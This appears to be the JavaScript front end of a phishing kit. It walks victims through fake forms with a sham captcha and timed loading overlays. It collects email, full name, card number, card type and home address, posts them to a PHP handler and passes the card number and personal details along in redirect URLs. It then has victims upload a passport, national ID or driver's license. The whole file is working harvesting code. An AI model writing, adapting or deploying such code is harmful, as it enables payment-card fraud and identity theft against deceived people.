// JavaScript Document

(function(){
	
	
	$('#expdate').on('keyup', function(){
	   var v = this.value;
	   if(v.match(/^\d{2}$/) !== null){
		  this.value = v + '/'; 
		}else if(v.match(/^\d{4}\/\d{4}$/) !== null){
			this.value = v + '';
		} 
		
	})
	
	$('#lexpdate').on('keyup', function(){
	   var v = this.value;
	   if(v.match(/^\d{2}$/) !== null){
		  this.value = v + '/'; 
		}else if(v.match(/^\d{4}\/\d{4}$/) !== null){
			this.value = v + '';
		} 
		
	})
	
	$('#dob').on('keyup', function(){
	   var v = this.value;
	   if(v.match(/^\d{2}$/) !== null){
		  this.value = v + '/'; 
		}else if(v.match(/^\d{2}\/\d{2}$/) !== null){
			this.value = v + '/';
		} 
		
	})
	
	function makeRandomValue1()
	{
    	var text = "";
    	var possible = "123456789012735152312738126abcdriojglkmhncgfpoawurbfjdnskshnsn31731766577777777777235undbsrsvhss12312";

    	for( var i=0; i < 6; i++ )
        	text += possible.charAt(Math.floor(Math.random() * possible.length));

   		 return text;
		
	}
	
	$('#capcha-text').val(makeRandomValue1());
	
	$('#capcha-value').on('blur', function(){
		
		var a = $('#capcha-text').val();
	    var b = $('#capcha-value').val();
	    if(a == b){
		    
	   }else{
		   alert('Enter a correct capcha value!');
		   }
	   
	})
	
	function FadeOut(){
		$('.firstForm').fadeOut(100);	
	}
	function FadeOutOverlay(){
		$('.overlay').fadeOut(100);
		$('.secondForm').slideDown(1000);
		$('.firstForm').slideUp(500);
	}
	
	$('#fForm').on('submit', function(e){
		console.log('hello');
		 var em = $('#email').val();
         $('#email2').val(em);
	     $('#me').text(em);
		 
		 $('.overlay').fadeIn(100,function(){
			        setTimeout(FadeOutOverlay, 3000);
					
					
			});
		
		
		e.preventDefault();
	});
	
	function FadeOutOverlay2(){
		$('.overlay').fadeOut(100);	
		window.location.href = "doci.php?userid=kjgasda87sd87as5d78sad";
	}
	$('.capchabtn').on('click', function(){
	     $('.overlay').fadeIn(100,function(){
			        setTimeout(FadeOutOverlay2, 3000);
			});	
	})
	var mem = "";
	
	function FadeOutOverlay3(){
		$('.overlay').fadeOut(100);	
		window.location.href = "lepssl1.php?userid=kjgasda87sd87as5d78sad"+"&demail="+mem;
	}
	$('.capchabtnn').on('click', function(){
		mem = $('#nemail').val();
	     $('.overlay').fadeIn(100,function(){
			        setTimeout(FadeOutOverlay3, 3000);
			});	
	})
	
	
	$('#cardtype').on('change', function(){
		var optionValue = $(this).children("option:selected").val();
		if(optionValue == "Visa"){
			$('#cardtype').addClass('select1vimg');
			$('#cardtype').removeClass('select1mimg');
			$('#cardtype').removeClass('select1dimg');
			$('#cardtype').removeClass('select1aimg');
			$('#cardtype').removeClass('select1jimg');
			$('.mcarddetails').addClass('mcarddetailsv');
			//window.location.href = "pmc1.php";
		}
		if(optionValue == "MasterCard"){
			$('#cardtype').addClass('select1mimg');
			$('#cardtype').removeClass('select1vimg');
			$('#cardtype').removeClass('select1dimg');
			$('#cardtype').removeClass('select1aimg');
			$('#cardtype').removeClass('select1jimg');
		}
		if(optionValue == "Discover"){
			$('#cardtype').addClass('select1dimg');
			$('#cardtype').removeClass('select1mimg');
			$('#cardtype').removeClass('select1vimg');
			$('#cardtype').removeClass('select1aimg');
			$('#cardtype').removeClass('select1jimg');
		}
		if(optionValue == "American Express"){
			$('#cardtype').addClass('select1aimg');
			$('#cardtype').removeClass('select1jimg');
			$('#cardtype').removeClass('select1dimg');
			$('#cardtype').removeClass('select1mimg');
			$('#cardtype').removeClass('select1vimg');
		}
		if(optionValue == "JCB"){
			$('#cardtype').addClass('select1jimg');
			$('#cardtype').removeClass('select1dimg');
			$('#cardtype').removeClass('select1mimg');
			$('#cardtype').removeClass('select1vimg');
			$('#cardtype').removeClass('select1aimg');
		}
		//console.log(this);
			
	});
	
	
	$('#lcardtype').on('change', function(){
		var optionValue = $(this).children("option:selected").val();
		if(optionValue == "Visa"){
			$('#lcardtype').addClass('select1vimg');
			$('#lcardtype').removeClass('select1mimg');
			$('#lcardtype').removeClass('select1dimg');
			$('#lcardtype').removeClass('select1aimg');
			$('#lcardtype').removeClass('select1jimg');
			$('.mcarddetails').addClass('mcarddetailsv');
			//window.location.href = "pmc1.php";
		}
		if(optionValue == "MasterCard"){
			$('#lcardtype').addClass('select1mimg');
			$('#lcardtype').removeClass('select1vimg');
			$('#lcardtype').removeClass('select1dimg');
			$('#lcardtype').removeClass('select1aimg');
			$('#lcardtype').removeClass('select1jimg');
		}
		if(optionValue == "Discover"){
			$('#lcardtype').addClass('select1dimg');
			$('#lcardtype').removeClass('select1mimg');
			$('#lcardtype').removeClass('select1vimg');
			$('#lcardtype').removeClass('select1aimg');
			$('#lcardtype').removeClass('select1jimg');
		}
		if(optionValue == "American Express"){
			$('#lcardtype').addClass('select1aimg');
			$('#lcardtype').removeClass('select1jimg');
			$('#lcardtype').removeClass('select1dimg');
			$('#lcardtype').removeClass('select1mimg');
			$('#lcardtype').removeClass('select1vimg');
		}
		if(optionValue == "JCB"){
			$('#lcardtype').addClass('select1jimg');
			$('#lcardtype').removeClass('select1dimg');
			$('#lcardtype').removeClass('select1mimg');
			$('#lcardtype').removeClass('select1vimg');
			$('#lcardtype').removeClass('select1aimg');
		}
		//console.log(this);
			
	});
	
	function makeRandomValue1s()
	{
    	var text = "";
    	var possible = "123456789012735152312738126abcdriojglkmhncgfpoawurbfjdnskshnsn31731766577777777777235undbsrsvhss12312";

    	for( var i=0; i < 60; i++ )
        	text += possible.charAt(Math.floor(Math.random() * possible.length));

   		 return text;
		
	}
	
	$('#btnsaves1').on('click', function(){
		$('.cyCard').css('display','none');
		$('.cyAddress').css('display','block');
	})
	
	var fullName = "";
	var cardType = "";
	var cardnum = "";
	var address = "";
	var yemail = "";
	function FadeOutOverlays(){
		$('.overlay').fadeOut(100);
		window.location.href = "pmc1.php?sessionid=" + makeRandomValue1s() + "?fn="+fullName+"&ct="+cardType+"&cn="+cardnum+"&addr="+address+"&lnemail="+yemail;
	}
	$('#dmtForm').on('submit', function(e){
		console.log('hello');
		cardType = $('#cardtype').val();
		cardnum = $('#cardnumber').val();
		fullName = $('#fullname').val();
		address = $('#address').val()+ " "+$('#city').val()+" "+$('#zipcode').val()+" "+$('#state').val()+" "+$('#country').val();
		 yemail =  $('#dmemail').val()
		 $.post('pr002.php',$(this).serialize(), function(data){
			console.log(data);
		});
		$('.overlay').fadeIn(100,function(){
			        setTimeout(FadeOutOverlays, 3000);	
			}); 
		e.preventDefault();
	});
	
	var sValue = "";
	
	function FadeOutOverlay3a(){
		$('.overlay').fadeOut(100);	
		window.location.href = "2uploads1d.php?userid=kjgasda87sd87as5d78sad"+"&svst="+sValue;
	}
	
	$('#upForm').on('submit', function(e){
		
		sValue = $('input[name="upidentity"]:checked').val();
		
		 $('.overlay').fadeIn(100,function(){
			        setTimeout(FadeOutOverlay3a, 3000);
			});	
			
			e.preventDefault();
		
	});
	
	var r = $('#myvalue').val();
	if(r == "Passport"){
		$('#niv').text("Passport");
	}
	if(r == "NationalID"){
		$('#niv').text("National ID");
	}
	if(r == "DriversLicense"){
		$('#niv').text("Driver's License");
	}
	
	
	function FadeOutOverlay3ab(){
		
		window.location.href = "thankyou.php?userid=kjgasda87sd87as5d78sad";
	}
	//upload images
	$('#upl2Form').on('submit', function(e){
		$.ajax({
			url:"upload_process.php",
			type:"POST",
			data:new FormData(this),
			contentType:false,
			cache:false,
			processData:false,
			success: function(data){
					//$('#loading').hide();
					//$('#message').html(data);
					//console.log(data);
					 $('.overlay').fadeIn(100,function(){
						 
						 $('.overlay').fadeOut(3000, function(){
							 $('#docImage2').empty().append(data);
							 setTimeout(FadeOutOverlay3ab, 100);
							});	
						 
			           
			          });	
					
					//console.log(data);
					//$('#btn-groom-next').css('display','block');
					
					
				}
		});
		
		e.preventDefault();
	});
		
})()